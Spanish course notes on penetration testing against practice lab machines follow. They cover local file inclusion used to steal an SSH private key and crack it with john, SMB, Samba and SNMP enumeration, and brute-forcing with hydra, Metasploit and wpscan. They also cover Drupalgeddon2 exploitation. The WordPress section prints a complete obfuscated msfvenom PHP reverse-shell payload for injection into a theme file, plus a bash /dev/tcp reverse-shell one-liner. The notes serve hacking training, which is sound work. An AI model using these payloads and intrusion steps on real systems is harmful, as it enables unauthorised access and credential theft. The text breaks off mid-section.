Subimos los dos malware y nos ponemos en escucha con netcat

nc -nlvp 443

En caso de que no funcione uno, nos podemos conectar con el otro payload

script /dev/null -c bash  
  
ctrl + c  
  
out  
  
stty raw -echo; fg  
  
reset xterm   
  
export SHELL=bash  
export TERM=xterm  
  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# ExplotaciÃ³n Vulnerabilidad Local File Inclusion

En esta clase, vamos a aprender a explotar la vulnerabilidad local file inclusion, la cual se trata de una vulnerabilidad que nos permite acceder a archivos internos de la máquina víctima; y así obtener información privilegiada que nos sirva para realizar otros ataques.

En esta ocasión, vamos a tratar de acceder al archivo id_rsa del usuario existente en el sistema para conseguir entrar vía ssh sin proporcionar ninguna contraseña.

Enlace de la máquina vulnerable:

https://hackmyvm.eu/machines/machine.php?vm=Friendly2

└─# arp-scan -I wlan0 --localnet                                                     
  
	192.168.0.162   08:00:27:0c:8f:a4       (Unknown)  
  
  
nmap -p- -sS -sC -sV --open --min-rate 2000 -Pn -vvv -n 192.168.0.162  
  
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
| ssh-hostkey:   
|   3072 74:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzieRbxwfRD6zuOrOmgPocWFr6Ufu9oCqOlt/Da5dqgRIZwctsaB6P5+6aDoCtBvFAzQXZQSMmT4GmIWR7eZ/Obou3fBSMU4X8R+C/VLyx1wifxNHy5LZ0+6djQX5cl5qhBseWQX3XIqPt+4DzRILCiMZSm9J8dnC0KEe14a8vkSfgV7Zn7xGOaw9R+KldazraLdT3zlzVuvjZjItIBjnA9tBorwY2u/RgMX++HXD3uySm1qt8w+pFGI7WFd/ktfwp3RhcdKMEYmqWhjAO3L9A9arf2vDYL9y/t53XIs+FAOXzoBc2A5gxxVBe7sMsuQCSF0Jw0z5Qf11Zj9si//6WG2KfihR7rKLEIfgeGFGvnilw88HT6sZQGTew1VpfRFLgMZTPpAOwzxlqUYIRWEEvmPrW7DGqzuY+8NpJQpiOhdjhuiS0/SW6PfHVB/nsNs1pWWwo/q+HxyAAS3WjCrkd1xMf92KMs1yheQHKUGNxV/zVuTbt9puXnVhIZGzzhsE=  
|   256 16:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFE+bBFz/3QsD9M4Nt6is2iJpFKhlUCSEqpUtATmeiN6jNBE245wbyIk7h3JqOxldcKyfhn7uysTo8NG4AqhPEA=  
|   256 65:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxSz6doeuMiydUVbE7ZwrdP8GW46iJYY3JxJPcNuvnA  
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.56 ((Debian))  
| http-methods:   
|_  Supported Methods: OPTIONS HEAD GET POST  
|_http-server-header: Apache/2.4.56 (Debian)  
|_http-title: Servicio de Mantenimiento de Ordenadores  
MAC Address: 08:00:27:0C:8F:A4 (Oracle VirtualBox virtual NIC)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
crtl + u para ver el codigo fuente / pero nada  
  
FUZZING WEB  
  
  
gobuster dir -u http://192.168.0.162:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://192.168.0.162:80  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/tools                (Status: 301) [Size: 314] [--> http://192.168.0.162/tools/]  
/assets               (Status: 301) [Size: 315] [--> http://192.168.0.162/assets/]  
/server-status        (Status: 403) [Size: 278]  
Progress: 207643 / 207644 (100.00%)  
  
  
 http://192.168.0.162/assets/ Apache/2.4.56 (Debian) Server at 192.168.0.162 Port 80  

![file:///tmp/.79UXO2/9.png](file:///tmp/.79UXO2/9.png)

nada, pero en la url apunta a un archivo

![file:///tmp/.79UXO2/10.png](file:///tmp/.79UXO2/10.png)

y esto parece ser una vulnerabilidad file inclutions

Lo mejor es borrar hasta doc= y retrocedemos ../../../ (lo mejor es hacerlo unas 8 veces) y al final poner /etc/passwd/ accedemos a los archivos internos de la victima

Encontramos un usuario (g0st)

entonces ../../../../../../home/g0st/.sh/id_rsa/

se consigue la private key, vemos mejor con ctrl+u, copiamos y guardamos en un archivo

Ahora le damos permisos chmod 600 a el id_rsa

ssh -i id_rsa ghost@192.168.0.162 

pero nos pide un passwd que seria un salvoconducto y ahora entra en juego JhonTheRipper

ssh2john id_rsa > hash  
  
john --wordlist=/usr/share/wordlists/rockyou.txt hash

Con john se puede crackear en local

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Uso de Wireshark para Interceptar Credenciales de Protocolos Vulnerables

Veremos el uso de wireshark y como analizar el tráfico de la red de forma sencilla, lo cual nos permitirá entender cómo se transporta la información por la red cuando se hace uso de protocolos que no protegen la información, como pueden ser FTP, HTTP, etc.

arp-scan wlan0 --localnet  
  
ftp 192....  
  
usr msfadmin  
pass msfadmin  
  

abrimos wireshark escuchando por la interfaz

nos volvemos a logear y wirshark captura las credenciales de ftp, en tanto y en cuanto filtremos por ftp y lo mismo con http

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# EnumeraciÃ³n y ExplotaciÃ³n del Protocolo SMB, SAMBA y SNMP

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Enumeración y Explotación Básica del Protocolo SMB (Puerto 445)

Cuando realizamos un escaneo de puertos con nmap, es muy frecuente encontrarnos con el puerto 445 abierto dentro de una máquina windows. Esto significa que el protocolo SMB está funcionando en el objetivo; y se trata de un protocolo el cual se puede enumerar haciendo uso de distintas herramientas. Además de ser susceptible a ataques de fuerza bruta utilizando hydra.

Enlace de la máquina vulnerable:

https://mega.nz/file/zIBTHZjT#IOsj05Xn0R4n7vlGy_gv0wvFJ1aZFT5uSW3nXK6KmD0

las maquinas windows tienen por defecto abierto el puerto 445

smbclient = tool from kali

smbclient -L 192.168.0.28 -Nnet

hydra -l mario -P /usr/share/wordlists/rockyou.txt smb://192.168.0.28:445

pim pam pum pass

nos podemos conectar por smb con smbclient

smbclient -L //192.168.0.28 -U 'mario'  
Password for [WORKGROUP\mario]: 123123

Muestra los directorios pero no se puede acceder, entonces:

smbmap -H 192.168.0.28 -u 'mario' -p '123123'

Ahora se ven los recursos compartidos pero seguimos sin tener acceso, asi que lo vamos hacer con smbclient

smbclient -U 'mario' //192.168.0.28/Users  
Password for [WORKGROUP\mario]: 123123

y nos da un prompt para ejecutar batch

[En el examen van aparecer preguntas de cuantos recursos compartidos hay, quien tiene acceso etc]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#### Enumeración y Explotación Básica del Protocolo SMB con Metasploit

En esta ocasión, realizaremos un ataque al protocolo SMB utilizando metasploit, donde podremos utilizar un diccionario para probar a una alta velocidad si encuentra la contraseña para acceder a este protocolo y enumerar los recursos compartidos en el sistema.

Enlace de la máquina vulnerable:

https://mega.nz/file/zIBTHZjT#IOsj05Xn0R4n7vlGy_gv0wvFJ1aZFT5uSW3nXK6KmD0

msf> use auxiliary/scanner/smb/smb_login

se puede hacer fuerza bruta o conectarse a travez de ssh etx

set RHOSTS 192.168.0.152  
Set VERBOSE false  
set SMBuser mario  
set PASS_file /usr/share/wordlists/rockyou.txt  
  
fuerza bruta con rockyou  
  
psexec es para adquirir una maquina remota windows  
  
use exploit/windows/smb/psexec  
  
show options  
  
set RHOSTS 192.168.0.152  
set SMBUser mario  
set SMBPass 123123  
run  
  
no funciono en este caso porque la maquina no lo tiene condfigurado  
  
Buscar informacion en las maquinas y no pases nada por alto, anota todo   
  
lo mas importante es encontrar usuarios

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# EnumeraciĆ³n de Usuarios SAMBA y uso de RPCCLIENT

En el momento que nos encontremos con el puerto 445 abierto o SAMBA funcionando, debemos de utilizar una herramienta conocida como RPCCLIENT para tratar de enumerar usuarios existentes dentro de la máquina objetivo; y así poder utilizar esta información para realizar ataques de fuerza bruta, tal como hicimos en clases anteriores.

Enlace de la máquina vulnerable:

https://vulnyx.com/#discover

Samba corre por el puerto 445 y sirve para conectarse con equipos que no son windows

arp-scan -I wlan0 --localnet  
192.168.0.100  
  
nmap -p- -sCVS --open --min-rate=5000 -Pn -n 192.168.0.100  
  
445/tcp open  netbios-ssn Samba smbd 4.6.2  
  
Host script results:  
| smb2-security-mode:   
|   3:1:1:   
|_    Message signing enabled but not required  
|_nbstat: NetBIOS name: DISCOVER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  
| smb2-time:   
|   date: 2024-05-22T13:16:43  
|_  start_date: N/A  
  
└─# rpcclient -U "" -N 192.168.0.100      
  
rpcclient $> srvinfo  
  
 DISCOVER       Wk Sv PrQ Unx NT SNT Samba 4.13.13-Debian  
        platform_id     :       500  
        os version      :       6.1  
        server type     :       0x809a03  
  
rpcclient $> querydispinfo  
  
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: ken      Name:   Desc:   
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: takeshi  Name:   Desc:   
  
Encontro 2 usuarios (ken y takeshi)  
  
tambien..  
  
rpcclient $> enumdomusers  
user:[ken] rid:[0x3e8]  
user:[takeshi] rid:[0x3e9]  
  
ahora se viene la fuerza bruta  
  
msfdb init && msfconsole -q  
  
use scanner/smb/smb_login  
  
set RHOSTS  
set PASS_FILE /usr/share/wordlists/rockyou.txt  
set VERBOSE false  
set SMBUser ken  
run  
  
smbmap -u 'ken' -p 'kenken' -H 192.168.0.100  
  
[+] IP: 192.168.0.100:445       Name: discover.fibertel.com.ar  Status: Authenticated  
        Disk                                                    Permissions     Comment  
        ----                                                    -----------     -------  
        print$                                                  READ ONLY       Printer Drivers  
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.13.13-Debian)  
        ken                                                     READ, WRITE     File Upload Path  
  
permite leer solo el fichero "ken"  
  
└─# smbmap -u 'ken' -p 'kenken' -H 192.168.0.100 -r ken  
  
[+] IP: 192.168.0.100:445       Name: discover.fibertel.com.ar  Status: Authenticated  
        Disk                                                    Permissions     Comment  
        ----                                                    -----------     -------  
        print$                                                  READ ONLY       Printer Drivers  
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.13.13-Debian)  
        ken                                                     READ, WRITE     File Upload Path  
        ./ken  
        dr--r--r--                0 Wed May 22 11:45:46 2024    .  
        dr--r--r--                0 Mon Jul  3 18:19:50 2023    ..  
        fr--r--r--               15 Tue Jul  4 07:33:20 2023    index.html  
                                                                               
                                                                               
Dentro del directorio "ken" se pueden ver otros ficheros  
  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# EnumeraciÃ³n y ExplotaciÃ³n del Protocolo SNMP

El protocolo SNMP funciona con UDP, por lo que es posible que si hacemos un escaneo de puertos con nmap por UDP nos encontremos con este protocolo funcionando dentro de la máquina objetivo, por lo que para enumerarlo, utilizaremos herramientas como onesixtyone y snmpwalk.

Enlace de la máquina vulnerable:

https://vulnyx.com/#chain

arp-scan -I wlan0 --localnet  
└─# nmap -p- -sS -sC -sV --open --min-rate 5000 -Pn -n 192.168.0.164  
  
└─# ping -c 1 192.168.0.164 -R  
PING 192.168.0.164 (192.168.0.164) 56(124) bytes of data.  
64 bytes from 192.168.0.164: icmp_seq=1 ttl=64 time=0.315 ms  
RR:     192.168.0.83  
        192.168.0.164  
        192.168.0.164  
        192.168.0.83  
  
  
  
└─# nmap -p- -sS -sC -sV --open --min-rate 5000 -Pn -n 192.168.0.164  
PORT   STATE SERVICE VERSION  
80/tcp open  http    Apache httpd 2.4.56 ((Debian))  
|_http-server-header: Apache/2.4.56 (Debian)  
|_http-title: Chain  
MAC Address: 08:00:27:43:82:FF (Oracle VirtualBox virtual NIC)  
  
nmap -sU --top-ports 200 --min-rate 5000 -n -Pn 192.168.0.164  
  
PORT      STATE  SERVICE  
161/udp   open   snmp  
443/udp   closed https  
5000/udp  closed upnp  
30718/udp closed unknown  
49211/udp closed unknown  
MAC Address: 08:00:27:43:82:FF (Oracle VirtualBox virtual NIC)  
  
  
Objeto de interes: 161/snmp   
  
Hay 2 herramientas para enumerar dentro del protocolo udp:  
  
onesixtyone -c /usr/share/wordlists/rockyou.txt	192.168.0.164  
  
192.168.0.164 [security] Linux chain 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64  
  
como se ve, encontro la clave "security"   
  
snmpwalk -v 2c -c security 192.168.0.164 (con esto, accedo a la informacion que se esta transmitiendo en este protocolo)  
  
Created directory: /var/lib/snmp/cert_indexes  
iso.3.6.1.2.1.1.1.0 = STRING: "Linux chain 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64"  
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10  
iso.3.6.1.2.1.1.3.0 = Timeticks: (121547) 0:20:15.47  
iso.3.6.1.2.1.1.4.0 = STRING: "Blue <blue@chaincorp.nyx>"  
iso.3.6.1.2.1.1.5.0 = STRING: "Chain"  
iso.3.6.1.2.1.1.6.0 = STRING: "VulNyx.com"  
iso.3.6.1.2.1.1.8.0 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1  
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1  
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1  
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1  
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1  
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49  
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50  
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4  
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3  
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92  
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."  
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."  
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."  
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"  
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."  
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"  
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"  
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"  
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."  
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."  
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (3) 0:00:00.03  
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (121954) 0:20:19.54  
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E8 05 16 11 09 36 00 2B 02 00   
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216  
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.10.0-23-amd64 root=UUID=5ed23ff9-728b-4a2d-b183-ac3d76b133ba ro quiet  
"  
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0  
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 81  
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0  
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)  
  
encontramos el dominio chaincorp.nyx /lo agregamos a /etc/hosts/ junto con la ip

nano /etc/hosts/ > 192.168.0.164 chaincorp.nyx

ahora ese dominio apunta a esa ip y podemos pegarla en el navegar

Comprobar si tiene subdominios...

 wfuzz -c --hc=404,400 --hl=367,11  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.chaincorp.nyx" -u 192.168.0.164  
  
filtre por --hc=404,400 para que no se repitan los codigos de estado  
  
tambien por --hl=367,11 porque el numero de lineas era interminable  
  
encontro, por el momento un "utils."  
  
asi que nos dirigimos al archivo /etc/hosts/ > 192.168.0.164 y agregamos el "utils.chaincorp.nyx"  
  
lo buscamos en el navegador y encontramos cosas

![file:///tmp/.79UXO2/11.png](file:///tmp/.79UXO2/11.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# HACKING ENTORNOS CMS

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Hacking en Entornos WordPress – Parte 1

Comenzamos con la explotación y enumeración de WordPress, donde veremos las rutas más importantes que debemos acceder para comprobar la existencia de vulnerabilidades, así como acceder al panel de login de una web hecha en WordPress.

Enlace de la máquina vulnerable:

https://tryhackme.com/room/internal

connect to tryhackme  
  
ping -c 10.10.88.15 -R  
  
ttl=61  
  
nmap -sSCV -p- --open --min-rate=5000 -vvv -n -Pn 10.10.88.15   
  
p22 y 80  
  
search web 10.10.88.15:80  
  
server apache ubuntu  
  
search codigo fuente (ctrl+u)  
  
si no hay nada, so fuzzing  
  
gobuster dir -u https://10.10.88.15/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
  
ATENTO A LA HTTPS!!!!!!!!!!  
  
gobuster dir -u http://10.10.88.15/ -w /usr/share/wordlist/dirbuster/directory-list-lowercase-2.3-medium  
  
encontro un blog  
  

![file:///tmp/.79UXO2/12.png](file:///tmp/.79UXO2/12.png)

analizamos el codigo fuente...

![file:///tmp/.79UXO2/13.png](file:///tmp/.79UXO2/13.png)

se puede ver que hay un “http://internal.thm/blog...” apuntando a un dominio

con lo cual lo agregamos a la carpeta de etc/hosts/ 10.10.88.15 > internal.thm

refrescamos el [http://10.10.88.15/blog](http://10.10.88.15/blog) y nos aparece una pag de wordpress

![file:///tmp/.79UXO2/14.png](file:///tmp/.79UXO2/14.png)

En el examen es mas que seguro que aparezca el directorio ‘’'''wp-login''''

![file:///tmp/.79UXO2/15.png](file:///tmp/.79UXO2/15.png)

(si no carga le agregamos un .php)

![file:///tmp/.79UXO2/16.png](file:///tmp/.79UXO2/16.png)

Tambien se podia hacer

gobuster dir -u http://10.10.88.15/blog -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php  
  
entonces aqui filtramos para que busque por php y encuentra un monton de cosas  
  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Hacking en Entornos WordPress – Parte 2

WordPress es uno de los CMS más conocidos y populares a día de hoy, por lo que resulta fundamental mantenerlo protegido y securizado, aunque disponemos de herramientas como WPscan que nos permite realizar una auditoría de este CMS y poder enumerar tanto plugins vulnerables como usuarios existentes.

Enlace de la máquina vulnerable:

https://tryhackme.com/room/internal

wpscan --url http://10.10.88.15/blog/ sin el login --enumerate u,vp  
  
Detecto un usuario "admin"  
  
ahora hacemos fuerza bruta  
  
wpscan --url http://10.10.88.15/blog/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin  
  
pim pam pum  
  
entonctro el pass "my2boys"  
  
ingresamos al login con las credenciales..  
  

![file:///tmp/.79UXO2/17.png](file:///tmp/.79UXO2/17.png)

como no vamos a poder acceder a internet y no podemos cargar una plantilla por no sabemos html ni javascript....

nos diriginmos a “APPEARANCE” (APARIENCIA) luego “theme editor” editor de tema

![file:///tmp/.79UXO2/18.png](file:///tmp/.79UXO2/18.png)

buscar la plantilla theme footer

![file:///tmp/.79UXO2/19.png](file:///tmp/.79UXO2/19.png)

En theme files aparace en la misma columna theme footer que seria la plantilla de la pagina principal y es ideal para inyectar un payload con php

msfvenom

msfvenom -p php/reverse_php LHOST=192.168.0.82 LPORT=443 -f raw > wordpresspoison.php  
  
cat a wordpresspoison.php   
  
 /*<?php /**/  
      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);  
      $dis=@ini_get('disable_functions');  
      if(!empty($dis)){  
        $dis=preg_replace('/[, ]+/',',',$dis);  
        $dis=explode(',',$dis);  
        $dis=array_map('trim',$dis);  
      }else{  
        $dis=array();  
      }  
        
    $ipaddr='192.168.0.82';  
    $port=443;  
  
    if(!function_exists('LNTaqcdirMh')){  
      function LNTaqcdirMh($c){  
        global $dis;  
          
      if (FALSE !== stristr(PHP_OS, 'win' )) {  
        $c=$c." 2>&1\n";  
      }  
      $mnGUfbW='is_callable';  
      $rSnMdRX='in_array';  
        
      if($mnGUfbW('shell_exec')&&!$rSnMdRX('shell_exec',$dis)){  
        $o=`$c`;  
      }else  
      if($mnGUfbW('proc_open')&&!$rSnMdRX('proc_open',$dis)){  
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);  
        $o=NULL;  
        while(!feof($pipes[1])){  
          $o.=fread($pipes[1],1024);  
        }  
        @proc_close($handle);  
      }else  
      if($mnGUfbW('exec')&&!$rSnMdRX('exec',$dis)){  
        $o=array();  
        exec($c,$o);  
        $o=join(chr(10),$o).chr(10);  
      }else  
      if($mnGUfbW('popen')&&!$rSnMdRX('popen',$dis)){  
        $fp=popen($c,'r');  
        $o=NULL;  
        if(is_resource($fp)){  
          while(!feof($fp)){  
            $o.=fread($fp,1024);  
          }  
        }  
        @pclose($fp);  
      }else  
      if($mnGUfbW('passthru')&&!$rSnMdRX('passthru',$dis)){  
        ob_start();  
        passthru($c);  
        $o=ob_get_contents();  
        ob_end_clean();  
      }else  
      if($mnGUfbW('system')&&!$rSnMdRX('system',$dis)){  
        ob_start();  
        system($c);  
        $o=ob_get_contents();  
        ob_end_clean();  
      }else  
      {  
        $o=0;  
      }  
      
        return $o;  
      }  
    }  
    $nofuncs='no exec functions';  
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){  
      $s=@fsockopen("tcp://192.168.0.82",$port);  
      while($c=fread($s,2048)){  
        $out = '';  
        if(substr($c,0,3) == 'cd '){  
          chdir(substr($c,3,-1));  
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {  
          break;  
        }else{  
          $out=LNTaqcdirMh(substr($c,0,-1));  
          if($out===false){  
            fwrite($s,$nofuncs);  
            break;  
          }  
        }  
        fwrite($s,$out);  
      }  
      fclose($s);  
    }else{  
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);  
      @socket_connect($s,$ipaddr,$port);  
      @socket_write($s,"socket_create");  
      while($c=@socket_read($s,2048)){  
        $out = '';  
        if(substr($c,0,3) == 'cd '){  
          chdir(substr($c,3,-1));  
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {  
          break;  
        }else{  
          $out=LNTaqcdirMh(substr($c,0,-1));  
          if($out===false){  
            @socket_write($s,$nofuncs);  
            break;  
          }  
        }  
        @socket_write($s,$out,strlen($out));  
      }  
      @socket_close($s);  
    }  
  
  
copiamos el codigo y lo subimos al edit   
  
  
      \\\\\\\\IMPORTANTE/////////  
        
      LA IP ES LA PROPORCIONADA POR TRYHACKMY  
        
     nc -lnvp 443  
       
     bash -c "sh -i >& /dev/tcp/10.6.71.137/9001 0>&1"  
     ahi tenes tu ip y el puerto por donde se va a redirigir la sesion  
     PELOTUDO  
       
     nc -lnvp 9001  
     

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Hacking en Entornos Drupal

Drupal es un CMS muy utilizado a día de hoy, tratándose de una alternativa a WordPress, por lo que también existen técnicas de explotación y vulnerabilidades en este tipo de CMS.

En esta ocasión, vamos a ver cómo detectar la versión de un CMS Drupal y cual es su principal vulnerabilidad.

Enlace de la plataforma Comunidad Hacking Ético donde se podrá acceder al enlace de descarga:

https://ctf.comunidadhackingetico.es/challenges

por lo pronto no pude descargarla porque mega es una poronga asi que tomo nota del video

arp-scan -I wlan0 --localnet  
ip  
ping -c ip -R  
  
nmap -p- -sSCV --open --min-rate=5000 -Pn -n -vvv ip  
  
open 22,80  
  
80=drupal-7.57  
  
browser ip p80 ...  
  
le pegamos la ip/drupal-7.57/

![file:///tmp/.79UXO2/20.png](file:///tmp/.79UXO2/20.png)

buscamos en el codigo fuente la version de drupal, en este caso ya la tenemos

msfconsole

msf6>search drupal 7

![file:///tmp/.79UXO2/21.png](file:///tmp/.79UXO2/21.png)

use exploit/unix/webapp/drupal_drupalgeddon2  
  
set RHOSTS http://192.168.0.2/drupal-7.57/  
  
hay que poner toda la ruta  
  
nos da una sesion de meterpreter, si queres podes poner "shell" y nos da una shell de linux  
  
no da un prompt pero si pongo bash -i, aparece uno  
  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# ESCALADA DE PRIVILEGIOS + POST EXPLOTACION

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Escalada de Privilegios en Linux – Sudo -l

Una vez hayamos obtenido acceso remoto al servidor, es necesario proceder con la escalada de privilegios, para poder convertirnos en el usuario root del sistema y así contar con todo tipo de permisos sobre el mismo.

En esta clase, veremos una técnicas de enumeración mediante la cual podremos ver qué aplicativo podemos ejecutar como root, lo cual nos servirá para escalar privilegios.

Enlace de la máquina vulnerable:

https://hackmyvm.eu/machines/machine.php?vm=Friendly

arp-scan -I wlan0 --localnet  
  
192.168.0.121  
  
ping -c 192.168.0.121 -R  
  
ttl=64  
  
nmap -p- -sSCV --open --min-rate 5000 -Pn -n -vvv 192.168.0.121  
  
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     ProFTPD  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
